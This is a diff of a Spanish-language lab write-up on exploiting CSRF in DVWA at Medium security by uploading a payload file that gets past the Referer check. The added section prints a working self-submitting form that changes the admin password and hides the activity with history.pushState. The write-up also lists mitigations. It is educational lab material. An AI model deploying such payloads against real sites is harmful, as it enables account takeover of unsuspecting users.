@@ -1,56 +1,73 @@
 # Reporte de Explotación: CSRF Bypass (Nivel: Medium) - DVWA
 
-Este documento detalla la explotación de una vulnerabilidad de **Cross-Site Request Forgery (CSRF)** en un entorno con seguridad media, utilizando una técnica de encadenamiento con **File Upload** para evadir las restricciones de origen.
+Este documento detalla la explotación de una vulnerabilidad de **Cross-Site Request Forgery (CSRF)** mediante el encadenamiento con **File Upload**. El ataque aprovecha un payload alojado internamente para evadir las restricciones de seguridad basadas en el origen de la petición.
 
 ---
 
 ## 🔍 Análisis de la Vulnerabilidad
 
-En el nivel de seguridad **Medio**, el servidor implementa una validación básica de la cabecera `HTTP_REFERER`. 
+En el nivel de seguridad **Medio**, la aplicación intenta protegerse validando la cabecera `HTTP_REFERER`.
 
-* **Mecanismo de Defensa:** El backend verifica que la petición de cambio de contraseña provenga del mismo dominio del servidor. Esto bloquea ataques ejecutados desde sitios maliciosos externos.
-* **Debilidad:** Si un atacante logra alojar el payload malicioso **dentro del propio servidor**, la cabecera `Referer` coincidirá con el dominio permitido, eludiendo la protección.
+* **Mecanismo de Defensa:** El servidor verifica que la petición de cambio de contraseña provenga del mismo dominio.
+* **Debilidad:** Esta defensa es ineficaz si el atacante logra colocar su código malicioso dentro del propio servidor, ya que la petición resultante tendrá un referente "interno" legítimo.
 
 ---
 
-## 🚀 Proceso de Explotación (Chaining Vulnerabilities)
-
-Para este ataque, se utilizó una estrategia de encadenamiento de vulnerabilidades:
+## 🚀 Proceso de Explotación (Chaining)
 
 ### 1. Preparación del Payload
-Primero, se crea un archivo llamado `csrf.php` que contiene un formulario auto-ejecutable (o un script de redirección) diseñado para enviar los parámetros de cambio de contraseña (`password_new`, `password_conf` y `Change`).
+Se utilizó un archivo PHP que contiene un formulario oculto y un script de auto-envío (`submit`) para forzar el cambio de contraseña a `pass`.
 
-### 2. Carga del archivo (File Upload)
-Para alojar el ataque en el servidor objetivo:
-1. Se ajusta temporalmente la seguridad a **Low** para facilitar la subida.
-2. Se utiliza el módulo **File Upload** para subir `csrf.php`.
+**Código del archivo `localhost.php`:**
 
-![Archivo subido con éxito](images/5.contraseña_cambiada.png)
+```html
+<html>
+ <body>
+  <script>history.pushState('', '', '/')</script>
+  <form action="http://localhost/DVWA/vulnerabilities/csrf/">
+   <input type="hidden" name="password&#95;new" value="pass" />
+   <input type="hidden" name="password&#95;conf" value="pass" />
+   <input type="hidden" name="Change" value="Change" />
+   <input type="submit" value="Submit request" />
+  </form>
+  <script>
+   document.forms[0].submit();
+  </script>
+ </body>
+</html>
+```
 
-### 3. Ejecución del Ataque
-Una vez subido, el archivo está disponible en una URL interna del servidor (ej. `http://192.168.170.131/hackable/uploads/csrf.php`).
+*El script incluye `history.pushState` para ocultar la actividad y envía los parámetros `password_new`, `password_conf` y `Change` automáticamente.*
 
-Al acceder a esta URL, el navegador envía la petición de cambio de contraseña. Como el archivo reside en el servidor local, el `HTTP_REFERER` es válido y el servidor procesa el cambio.
+### 2. Carga mediante File Upload
+Para facilitar la subida del archivo al servidor, se ajustó temporalmente la seguridad a **Low**. Esto permitió alojar el archivo `localhost.php` en el directorio `/uploads/` del servidor víctima.
+
+### 3. Ejecución del Ataque (Nivel Medium)
+Con el archivo ya alojado y la seguridad establecida de nuevo en **Medium**, se procedió a ejecutar el ataque accediendo a la URL interna del archivo subido. 
+
+Al ejecutarse desde el mismo dominio (`localhost`), la validación del `Referer` fue superada con éxito.
 
 ---
 
 ## 📊 Resultados
 
-Al ejecutar el payload alojado internamente, se confirma la modificación de las credenciales de administrador.
+Tras la ejecución del script alojado internamente, el servidor procesó la solicitud de cambio de contraseña correctamente.
 
-* **Estado:** Password Changed (Explotado con éxito).
-* **URL de ejecución:** `http://[IP-OBJETIVO]/hackable/uploads/csrf.php`
+![Confirmación de cambio de contraseña](images/5.contraseña_cambiada.png)
+
+* **Resultado:** "Password Changed."
+* **Impacto:** Se logró cambiar la contraseña de administración eludiendo la seguridad de nivel medio mediante una vulnerabilidad secundaria.
 
 ---
 
 ## 🛡️ Medidas de Mitigación
 
-La validación del `Referer` es una defensa débil. Para una protección robusta, se recomienda:
+Para prevenir ataques de este tipo, se recomienda:
 
-1.  **Anti-CSRF Tokens:** Implementar tokens únicos y aleatorios por sesión que deben enviarse con cada petición sensible. Esta es la defensa más efectiva.
-2.  **SameSite Cookie Attribute:** Configurar las cookies de sesión con el atributo `SameSite=Strict` o `Lax` para evitar que se envíen en peticiones transversales.
-3.  **Verificación de Contraseña Actual:** Obligar al usuario a introducir su contraseña antigua antes de permitir el cambio por una nueva.
-4.  **Seguridad en Cargas de Archivos:** Evitar que los archivos subidos tengan permisos de ejecución o que se almacenen en directorios accesibles vía web con extensiones ejecutables como `.php`.
+1.  **Anti-CSRF Tokens:** Implementar tokens aleatorios únicos por sesión que el servidor valide en cada petición.
+2.  **Validación Estricta de Archivos:** Evitar la subida de archivos ejecutables (`.php`, `.html`) y almacenarlos en directorios sin permisos de ejecución.
+3.  **Confirmación de Contraseña:** Solicitar la contraseña actual antes de permitir el cambio a una nueva.
+4.  **Atributos de Cookie SameSite:** Configurar cookies con `SameSite=Strict` para mitigar el envío de credenciales en peticiones no deseadas.
 
 ---
-> **Aviso:** Este contenido es estrictamente educativo. El uso de estas técnicas sin autorización es ilegal.
+> **Aviso:** Este contenido es para fines educativos. El acceso no autorizado a sistemas es ilegal.
